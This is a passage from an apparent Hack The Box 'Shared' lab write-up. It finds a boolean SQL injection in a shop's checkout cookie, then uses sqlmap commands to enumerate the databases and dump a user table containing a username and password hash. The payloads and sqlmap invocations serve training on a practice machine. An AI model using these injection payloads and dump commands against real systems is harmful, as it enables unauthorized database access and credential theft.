</span></span><span style="display:flex;"><span>| /*&amp;search_query<span style="color:#f92672">=</span> /*&amp;back<span style="color:#f92672">=</span> /*&amp;n<span style="color:#f92672">=</span> /*controller<span style="color:#f92672">=</span>addresses 
</span></span><span style="display:flex;"><span>|_/*controller<span style="color:#f92672">=</span>address /*controller<span style="color:#f92672">=</span>authentication
</span></span><span style="display:flex;"><span>| http-title: Shared Shop
</span></span><span style="display:flex;"><span>|_Requested resource was https://shared.htb/index.php
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 620.08 seconds
</span></span></code></pre></div><h2 id="surfing-webpage">Surfing WebPage</h2>
<p>When I tried to access the page on port <em>80</em>, I got redirected to <em>

<a href="https://shared.htb/" target="_blank">https://shared.htb/</a></em>, so I&rsquo;ll add this host to my <em>/etc/hosts</em> file.</p>
<p><code>echo -e '10.10.11.172\tshared.htb' | sudo tee -a /etc/hosts</code></p>
<p>Now I am able to surf the page:</p>
<p><img src="index_page_ssl.png" alt="Index Page"></p>
<p>However this is the secure version of the page on port <em>443</em> (https), so I tried to access the one without <em>SSL</em> on port <em>80</em> but I got redirected to the <em>SSL</em> version.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl http://shared.htb/index.php -v
</span></span><span style="display:flex;"><span>*   Trying 10.10.11.172:80...
</span></span><span style="display:flex;"><span>* Connected to shared.htb <span style="color:#f92672">(</span>10.10.11.172<span style="color:#f92672">)</span> port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
</span></span><span style="display:flex;"><span>&gt; GET /index.php HTTP/1.1
</span></span><span style="display:flex;"><span>&gt; Host: shared.htb
</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/7.85.0
</span></span><span style="display:flex;"><span>&gt; Accept: */*
</span></span><span style="display:flex;"><span>&gt; 
</span></span><span style="display:flex;"><span>* Mark bundle as not supporting multiuse
</span></span><span style="display:flex;"><span>&lt; HTTP/1.1 <span style="color:#ae81ff">301</span> Moved Permanently
</span></span><span style="display:flex;"><span>&lt; Server: nginx/1.18.0
</span></span><span style="display:flex;"><span>&lt; Date: Fri, <span style="color:#ae81ff">11</span> Nov <span style="color:#ae81ff">2022</span> 19:09:59 GMT
</span></span><span style="display:flex;"><span>&lt; Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
</span></span><span style="display:flex;"><span>&lt; Transfer-Encoding: chunked
</span></span><span style="display:flex;"><span>&lt; Connection: keep-alive
</span></span><span style="display:flex;"><span>&lt; Cache-Control: no-cache
</span></span><span style="display:flex;"><span>&lt; Location: https://shared.htb/index.php
</span></span><span style="display:flex;"><span>&lt; 
</span></span><span style="display:flex;"><span>* Connection <span style="color:#75715e">#0 to host shared.htb left intact</span>
</span></span></code></pre></div><p>It looks like this site is a shopping site having many products, and after clicking on one of them, I can add it to cart:</p>
<p><img src="products.png" alt="Products"></p>
<p>Once I added the product to cart, a popup appeared asking me if I want to proceed to checkout:</p>
<p><img src="add_to_cart.png" alt="Added To Cart"></p>
<h3 id="discovering-new-domain">Discovering New Domain</h3>
<p>After clicking on the <em>proceed</em> button, the site displayed the cart for me having another <em>PROCEED TO CHECKOUT</em> button:</p>
<p><img src="proceed_to_checkout.png" alt="Proceed To Checkout"></p>
<p><img src="new_domain.png" alt="New Domain"></p>
<p>I got redirected to a new subdomain <em>checkout.shared.htb</em> when I click it, so I&rsquo;ll add it to <em>/etc/hosts</em>.</p>
<p><code>echo -e '10.10.11.172\tcheckout.shared.htb' | sudo tee -a /etc/hosts</code></p>
<p><img src="checkout_page.png" alt="Chechout Page"></p>
<p>Looks like my product is present in this page and I can proceed and pay for it. Without submitting any information, I tried to click the <em>pay</em> button to see what will happen, and I got a <em>payment successfull</em> message:</p>
<p><img src="paying.png" alt="Paying"></p>
<p>Since my product from the other domain is displayed here, the only way I could think that this is possible is using some sort of cookies shared between these domains. So, I&rsquo;ll open <code>burpsuite</code> to see what&rsquo;s happening behind the scene.</p>
<p>By refreshing the page and intercepting the request, I got this:</p>
<p><img src="seeing_cookie.png" alt="Intercepting Rquest"></p>
<p>It appears that I was right, and there is a cookie that holds my cart products information: <em>custom_cart={&ldquo;YCS98E4A&rdquo;:&ldquo;1&rdquo;}</em></p>
<p>I&rsquo;ll try to play with this cookie a little bit, so I&rsquo;ll change the key from <em>YCS98E4A</em> to <em>ThisDoesNotExist</em> and forward the request:</p>
<p><img src="does_not_exist_cookie_key.png" alt="This Does Not Exist Key"></p>
<p><img src="not_found_checkout.png" alt="Not Found Checkout"></p>
<h3 id="discovering-sql-injection">Discovering SQL Injection</h3>
<p>Looks like there is no errors but the product value changed to <em>Not Found</em>. I&rsquo;ll try now to <em>fuzz</em> this cookie to see maybe it is vulnerable to some type of <em>Injection</em>:</p>
<p>First, I&rsquo;ll look for <em>SQL Injection</em>, so I&rsquo;ll send a simple <em>&rsquo; or &lsquo;1&rsquo;=&lsquo;1</em> payload in place of <em>YCS98E4A</em> in the cookie, so it becomes: <em>custom_cart={&quot;&rsquo; or &lsquo;1&rsquo;=&lsquo;1&quot;:&ldquo;1&rdquo;}</em></p>
<p><img src="trying_simple_sqli.png" alt="Trying SQL Injection"></p>
<p><img src="sqli_worked.png" alt="SQL Injection Worked"></p>
<h3 id="dumping-databse">Dumping Databse</h3>
<p>And it worked, which means that I can now dump the database using <code>sqlmap</code>:</p>
<p><code>sqlmap -u 'http://checkout.shared.htb' --cookie='custom_cart={&quot;7DA8SKYP *&quot;:&quot;This is testing !!&quot;}' --level 5 --risk 3 --technique=B --batch</code></p>
<ul>
<li><em>technique=B</em> means that I will use <em>Boolean Based SQL Injection</em> to test the vulnerability and dump data, and I know that from the payload I previously used.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#39;http://checkout.shared.htb&#39;</span> --cookie<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;custom_cart={&#34;7DA8SKYP *&#34;:&#34;This is testing !!&#34;}&#39;</span> --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> --technique<span style="color:#f92672">=</span>B --batch
</span></span><span style="display:flex;"><span>        ___
</span></span><span style="display:flex;"><span>       __H__
</span></span><span style="display:flex;"><span> ___ ___<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;]_____ ___ ___  {1.6.9#stable}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_ -| . [.]     | .&#39;| . |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|___|_  [,]_|_|_|__,|  _|
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      |_|V...       |_|   https://sqlmap.org
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] starting @ 22:24:37 /2022-11-11/
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">custom injection marker (&#39;*&#39;) found in option &#39;--headers/--user-agent/--referer/--cookie&#39;. Do you want to process it? [Y/n/q] Y
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:37] [INFO] flushing session file
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:37] [INFO] testing connection to the target URL
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:39] [INFO] checking if the target is protected by some kind of WAF/IPS
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:40] [INFO] testing if the target URL content is stable
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:40] [INFO] target URL content is stable
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:40] [INFO] testing if (custom) HEADER parameter &#39;Cookie #1*&#39; is dynamic
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">do you want to URL encode cookie values (implementation specific)? [Y/n] Y
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:41] [INFO] (custom) HEADER parameter &#39;Cookie #1*&#39; appears to be dynamic
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:41] [WARNING] heuristic (basic) test shows that (custom) HEADER parameter &#39;Cookie #1*&#39; might not be injectable
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:41] [INFO] testing for SQL injection on (custom) HEADER parameter &#39;Cookie #1*&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:41] [INFO] testing &#39;AND boolean-based blind - WHERE or HAVING clause&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:45] [INFO] (custom) HEADER parameter &#39;Cookie #1*&#39; appears to be &#39;AND boolean-based blind - WHERE or HAVING clause&#39; injectable (with --string=&#34;</span>This is testing !!<span style="color:#e6db74">&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:54] [INFO] heuristic (extended) test shows that the back-end DBMS could be &#39;MySQL&#39; 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">it looks like the back-end DBMS is &#39;MySQL&#39;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:24:54] [INFO] checking if the injection point on (custom) HEADER parameter &#39;Cookie #1*&#39; is a false positive
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">(custom) HEADER parameter &#39;Cookie #1*&#39; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sqlmap identified the following injection point(s) with a total of 54 HTTP(s) requests:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Parameter: Cookie #1* ((custom) HEADER)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: boolean-based blind
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: AND boolean-based blind - WHERE or HAVING clause
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: custom_cart={&#34;</span>7DA8SKYP <span style="color:#e6db74">&#39; AND 7963=7963-- BefO&#34;:&#34;This is testing !!&#34;}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:25:04] [INFO] testing MySQL
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:25:04] [INFO] confirming MySQL
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:25:05] [INFO] the back-end DBMS is MySQL
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">web application technology: Nginx 1.18.0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">back-end DBMS: MySQL &gt;= 5.0.0 (MariaDB fork)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:25:05] [INFO] fetched data logged to text files under &#39;</span>/home/kali/.local/share/sqlmap/output/checkout.shared.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 22:25:05 /2022-11-11/
</span></span></code></pre></div><p>The database appears to be <em>MySQL MariaDB</em>. Now I will dump the databases:</p>
<ul>
<li>
<p>To get the existing <em>databases</em>: <code>sqlmap -u 'http://checkout.shared.htb' --cookie='custom_cart={&quot;7DA8SKYP *&quot;:&quot;This is testing !!&quot;}' --level 5 --risk 3 --technique=B --batch --dbms=mysql --dbs</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#39;http://checkout.shared.htb&#39;</span> --cookie<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;custom_cart={&#34;7DA8SKYP *&#34;:&#34;This is testing !!&#34;}&#39;</span> --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> --technique<span style="color:#f92672">=</span>B --batch --dbms<span style="color:#f92672">=</span>mysql --dbs
</span></span><span style="display:flex;"><span>        ___
</span></span><span style="display:flex;"><span>      __H__
</span></span><span style="display:flex;"><span>___ ___<span style="color:#f92672">[</span>,<span style="color:#f92672">]</span>_____ ___ ___  <span style="color:#f92672">{</span>1.6.9#stable<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>|_ -| . <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;]     | .&#39;| . |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|___|_  [,]_|_|_|__,|  _|
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      |_|V...       |_|   https://sqlmap.org
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] starting @ 22:36:35 /2022-11-11/
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">custom injection marker (&#39;*&#39;) found in option &#39;--headers/--user-agent/--referer/--cookie&#39;. Do you want to process it? [Y/n/q] Y
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:35] [INFO] testing connection to the target URL
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sqlmap resumed the following injection point(s) from stored session:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Parameter: Cookie #1* ((custom) HEADER)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: boolean-based blind
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: AND boolean-based blind - WHERE or HAVING clause
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: custom_cart={&#34;</span>7DA8SKYP <span style="color:#e6db74">&#39; AND 8525=8525-- fdrV&#34;:&#34;This is testing !!&#34;}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:36] [INFO] testing MySQL
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:36] [INFO] confirming MySQL
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:36] [INFO] the back-end DBMS is MySQL
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">web application technology: Nginx 1.18.0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">back-end DBMS: MySQL &gt;= 5.0.0 (MariaDB fork)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:36] [INFO] fetching database names
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:36] [INFO] fetching number of databases
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:36] [WARNING] running in a single-thread mode. Please consider usage of option &#39;</span>--threads<span style="color:#e6db74">&#39; for faster data retrieval
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:36] [INFO] retrieved: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">do you want to URL encode cookie values (implementation specific)? [Y/n] Y
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:36:38] [INFO] retrieved: information_schema
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:37:02] [INFO] retrieved: checkout
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">available databases [2]:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] checkout
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] information_schema
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:37:14] [INFO] fetched data logged to text files under &#39;</span>/home/kali/.local/share/sqlmap/output/checkout.shared.htb<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 22:37:14 /2022-11-11/
</span></span></code></pre></div></li>
<li>
<p>To enumerate <em>tables</em> from <em>checkout</em> database: <code>sqlmap -u 'http://checkout.shared.htb' --cookie='custom_cart={&quot;7DA8SKYP *&quot;:&quot;This is testing !!&quot;}' --level 5 --risk 3 --technique=B --batch --dbms=mysql -D checkout --tables</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#39;http://checkout.shared.htb&#39;</span> --cookie<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;custom_cart={&#34;7DA8SKYP *&#34;:&#34;This is testing !!&#34;}&#39;</span> --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> --technique<span style="color:#f92672">=</span>B --batch --dbms<span style="color:#f92672">=</span>mysql -D checkout --tables
</span></span><span style="display:flex;"><span>        ___
</span></span><span style="display:flex;"><span>      __H__
</span></span><span style="display:flex;"><span>___ ___<span style="color:#f92672">[</span>.<span style="color:#f92672">]</span>_____ ___ ___  <span style="color:#f92672">{</span>1.6.9#stable<span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>|_ -| . <span style="color:#f92672">[(]</span>     | .<span style="color:#e6db74">&#39;| . |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|___|_  [,]_|_|_|__,|  _|
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      |_|V...       |_|   https://sqlmap.org
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span style="color:#66d9ef">for</span> any misuse or damage caused by this program
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> starting @ 22:40:03 /2022-11-11/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>custom injection marker <span style="color:#f92672">(</span><span style="color:#e6db74">&#39;*&#39;</span><span style="color:#f92672">)</span> found in option <span style="color:#e6db74">&#39;--headers/--user-agent/--referer/--cookie&#39;</span>. Do you want to process it? <span style="color:#f92672">[</span>Y/n/q<span style="color:#f92672">]</span> Y
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing connection to the target URL
</span></span><span style="display:flex;"><span>sqlmap resumed the following injection point<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> from stored session:
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>Parameter: Cookie <span style="color:#75715e">#1* ((custom) HEADER)</span>
</span></span><span style="display:flex;"><span>    Type: boolean-based blind
</span></span><span style="display:flex;"><span>    Title: AND boolean-based blind - WHERE or HAVING clause
</span></span><span style="display:flex;"><span>    Payload: custom_cart<span style="color:#f92672">={</span><span style="color:#e6db74">&#34;7DA8SKYP &#39; AND 8525=8525-- fdrV&#34;</span>:<span style="color:#e6db74">&#34;This is testing !!&#34;</span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> testing MySQL
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> confirming MySQL
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> the back-end DBMS is MySQL
</span></span><span style="display:flex;"><span>web application technology: Nginx 1.18.0
</span></span><span style="display:flex;"><span>back-end DBMS: MySQL &gt;<span style="color:#f92672">=</span> 5.0.0 <span style="color:#f92672">(</span>MariaDB fork<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching tables <span style="color:#66d9ef">for</span> database: <span style="color:#e6db74">&#39;checkout&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetching number of tables <span style="color:#66d9ef">for</span> database <span style="color:#e6db74">&#39;checkout&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> running in a single-thread mode. Please consider usage of option <span style="color:#e6db74">&#39;--threads&#39;</span> <span style="color:#66d9ef">for</span> faster data retrieval
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:03<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">do</span> you want to URL encode cookie values <span style="color:#f92672">(</span>implementation specific<span style="color:#f92672">)</span>? <span style="color:#f92672">[</span>Y/n<span style="color:#f92672">]</span> Y
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:04<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: user
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:10<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> retrieved: product
</span></span><span style="display:flex;"><span>Database: checkout
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">2</span> tables<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>+---------+
</span></span><span style="display:flex;"><span>| user    |
</span></span><span style="display:flex;"><span>| product |
</span></span><span style="display:flex;"><span>+---------+
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22:40:20<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>INFO<span style="color:#f92672">]</span> fetched data logged to text files under <span style="color:#e6db74">&#39;/home/kali/.local/share/sqlmap/output/checkout.shared.htb&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ending @ 22:40:20 /2022-11-11/
</span></span></code></pre></div></li>
<li>
<p>To dump data from <em>user table</em>: <code>sqlmap -u 'http://checkout.shared.htb' --cookie='custom_cart={&quot;7DA8SKYP *&quot;:&quot;This is testing !!&quot;}' --level 5 --risk 3 --technique=B --batch --dbms=mysql -D checkout -T user --dump</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sqlmap -u <span style="color:#e6db74">&#39;http://checkout.shared.htb&#39;</span> --cookie<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;custom_cart={&#34;7DA8SKYP *&#34;:&#34;This is testing !!&#34;}&#39;</span> --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span> --technique<span style="color:#f92672">=</span>B --batch --dbms<span style="color:#f92672">=</span>mysql -D checkout -T user --dump 
</span></span><span style="display:flex;"><span>        ___
</span></span><span style="display:flex;"><span>      __H__
</span></span><span style="display:flex;"><span>___ ___<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;]_____ ___ ___  {1.6.9#stable}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_ -| . [&#39;]     | .&#39;| . |
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|___|_  [,]_|_|_|__,|  _|
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      |_|V...       |_|   https://sqlmap.org
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[*] starting @ 22:41:49 /2022-11-11/
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">custom injection marker (&#39;*&#39;) found in option &#39;--headers/--user-agent/--referer/--cookie&#39;. Do you want to process it? [Y/n/q] Y
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:49] [INFO] testing connection to the target URL
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sqlmap resumed the following injection point(s) from stored session:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Parameter: Cookie #1* ((custom) HEADER)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Type: boolean-based blind
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Title: AND boolean-based blind - WHERE or HAVING clause
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Payload: custom_cart={&#34;</span>7DA8SKYP <span style="color:#e6db74">&#39; AND 8525=8525-- fdrV&#34;:&#34;This is testing !!&#34;}
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:50] [INFO] testing MySQL
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:50] [INFO] confirming MySQL
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:50] [INFO] the back-end DBMS is MySQL
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">web application technology: Nginx 1.18.0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">back-end DBMS: MySQL &gt;= 5.0.0 (MariaDB fork)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:50] [INFO] fetching columns for table &#39;</span>user<span style="color:#e6db74">&#39; in database &#39;</span>checkout<span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:50] [WARNING] running in a single-thread mode. Please consider usage of option &#39;</span>--threads<span style="color:#e6db74">&#39; for faster data retrieval
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:50] [INFO] retrieved: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">do you want to URL encode cookie values (implementation specific)? [Y/n] Y
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">3
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:51] [INFO] retrieved: id
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:41:54] [INFO] retrieved: username
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:42:14] [INFO] retrieved: password
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:42:30] [INFO] fetching entries for table &#39;</span>user<span style="color:#e6db74">&#39; in database &#39;</span>checkout<span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:42:30] [INFO] fetching number of entries for table &#39;</span>user<span style="color:#e6db74">&#39; in database &#39;</span>checkout<span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:42:30] [INFO] retrieved: 1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:42:32] [INFO] retrieved: 1
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:42:36] [INFO] retrieved: fc895d4eddc2fc12f995e18c865cf273
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:43:52] [INFO] retrieved: james_mason
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[22:44:05] [INFO] recognized possible password hashes in column &#39;</span>password<span style="color:#e6db74">&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
